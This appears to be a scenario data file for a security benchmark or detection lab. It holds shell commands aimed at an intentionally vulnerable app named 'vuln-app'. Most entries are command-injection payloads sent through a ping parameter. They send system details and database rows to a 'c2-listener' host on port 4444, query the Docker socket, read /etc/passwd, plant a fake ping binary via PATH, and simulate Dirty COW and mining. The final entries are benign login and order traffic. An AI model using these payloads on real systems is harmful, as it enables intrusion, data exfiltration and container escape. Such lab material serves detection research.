scenarios.command: set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;python -c \"import os,socket,subprocess; s=socket.socket(); s.connect(('c2-listener',4444)); s.sendall(subprocess.check_output('id;uname -a;hostname', shell=True)); s.close()\"" >/dev/null; sleep 2

set -eu; curl -sG 'http://vuln-app-dsock:5000/ping' --data-urlencode "ip=127.0.0.1;python -c \"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /version HTTP/1.0\\r\\nHost: docker\\r\\n\\r\\n'); print(s.recv(4096).decode(\\\'utf-8\\\', \\\'ignore\\\'))\"" >/dev/null; sleep 2

set -eu; curl -sG 'http://vuln-app-dsock:5000/ping' --data-urlencode "ip=127.0.0.1;python -c \"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /containers/json HTTP/1.0\\r\\nHost: docker\\r\\n\\r\\n'); print(s.recv(4096).decode(\\\'utf-8\\\', \\\'ignore\\\'))\"" >/dev/null; sleep 2

set -eu; curl -s -H 'Content-Type: application/json' -d '{"customer":"seed","item":"sku-001","quantity":1}' 'http://vuln-app:5000/api/order' >/dev/null; curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;python -c \"import json,sqlite3; conn=sqlite3.connect('/app/data/app.db'); data={'users': conn.execute('select username,role from users order by username').fetchall(), 'orders': conn.execute('select customer,item,quantity from orders order by id desc limit 5').fetchall()}; print(json.dumps(data, default=list))\"" >/dev/null; sleep 2

set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;printf '#!/bin/sh
echo hijacked > /tmp/hijack.txt
echo PWNED
' > /tmp/ping; chmod +x /tmp/ping; PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ping -c 1 127.0.0.1" >/dev/null; sleep 2
set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;ls -la /;ls -la /app;cat /etc/passwd;ps aux;find /app -maxdepth 2 -type f | head -n 20" >/dev/null; sleep 2

set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;python -c "exec('import mmap
f=open(\'/etc/ld.so.cache\',\'rb\')
m=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
ok=True
try:
 m[0]=0
except Exception:
 ok=False
m.close(); f.close(); print(\'dirtycow_sim\',ok)')"" >/dev/null; sleep 2

set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;python -c "exec('import time
t=time.time()+12
x=0
while time.time()<t:
 x=(x*1664525+1013904223) & 0xFFFFFFFF
print(\'miner_done\')')"" >/dev/null; sleep 2

set -eu; curl -s -H 'Content-Type: application/json' -d '{"customer":"seed","item":"sku-002","quantity":2}' 'http://vuln-app:5000/api/order' >/dev/null; curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;python -c \"import json,sqlite3,socket; conn=sqlite3.connect('/app/data/app.db'); rows=conn.execute('select customer,item,quantity from orders order by id desc limit 5').fetchall(); payload=json.dumps({'orders':[tuple(r) for r in rows]}); s=socket.socket(); s.connect(('c2-listener',4444)); s.sendall(payload.encode()); s.close()\"" >/dev/null; sleep 2

scenarios.description: Short benign smoke benchmark only; not part of the formal benign training corpus
scenarios.command: set -eu; for i in $(seq 1 25); do TOKEN=$(curl -s -H 'Content-Type: application/json' -d '{"username":"alice","password":"password"}' 'http://vuln-app:5000/api/login' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'); curl -s 'http://vuln-app:5000/health' >/dev/null; curl -s 'http://vuln-app:5000/api/items' >/dev/null; curl -s 'http://vuln-app:5000/api/search?q=sku' >/dev/null; curl -s -H 'Content-Type: application/json' -d '{"customer":"alice","item":"sku-001","quantity":1}' 'http://vuln-app:5000/api/order' >/dev/null; if [ -n "$TOKEN" ]; then curl -s -H "Authorization: Bearer $TOKEN" 'http://vuln-app:5000/api/me' >/dev/null; curl -s -X POST -H "Authorization: Bearer $TOKEN" 'http://vuln-app:5000/api/logout' >/dev/null; fi; sleep 0.2; done; sleep 2

scenarios.description: Short benign smoke benchmark only; not part of the formal benign training corpus
scenarios.command: set -eu; for i in $(seq 1 30); do TOKEN=$(curl -s -H 'Content-Type: application/json' -d '{"username":"alice","password":"password"}' 'http://vuln-app:5000/api/login' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'); if [ -n "$TOKEN" ]; then curl -s -H "Authorization: Bearer $TOKEN" 'http://vuln-app:5000/api/me' >/dev/null; curl -s -X POST -H "Authorization: Bearer $TOKEN" 'http://vuln-app:5000/api/logout' >/dev/null; fi; sleep 0.15; done; sleep 2

scenarios.description: Short benign smoke benchmark only; not part of the formal benign training corpus
scenarios.command: set -eu; for i in $(seq 1 12); do ORDER_ID=$(curl -s -H 'Content-Type: application/json' -d '{"customer":"alice","item":"sku-003","quantity":1}' 'http://vuln-app:5000/api/order' | sed -n 's/.*"order_id":\([0-9][0-9]*\).*/\1/p'); curl -s "http://vuln-app:5000/api/search?q=alice" >/dev/null; curl -s "http://vuln-app:5000/api/search?q=sku-003" >/dev/null; if [ -n "$ORDER_ID" ]; then curl -s "http://vuln-app:5000/api/order/$ORDER_ID" >/dev/null; fi; sleep 0.25; done; sleep 2

scenarios.description: Short benign smoke benchmark only; not part of the formal benign training corpus
scenarios.command: set -eu; for i in $(seq 1 20); do TOKEN=$(curl -s -H 'Content-Type: application/json' -d '{"username":"bob","password":"password"}' 'http://vuln-app:5000/api/login' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'); curl -s 'http://vuln-app:5000/api/items' >/dev/null; curl -s 'http://vuln-app:5000/api/search?q=alice' >/dev/null; if [ -n "$TOKEN" ]; then curl -s -H "Authorization: Bearer $TOKEN" 'http://vuln-app:5000/api/me' >/dev/null; curl -s -X POST -H "Authorization: Bearer $TOKEN" 'http://vuln-app:5000/api/logout' >/dev/null; fi; sleep 0.2; done; sleep 2
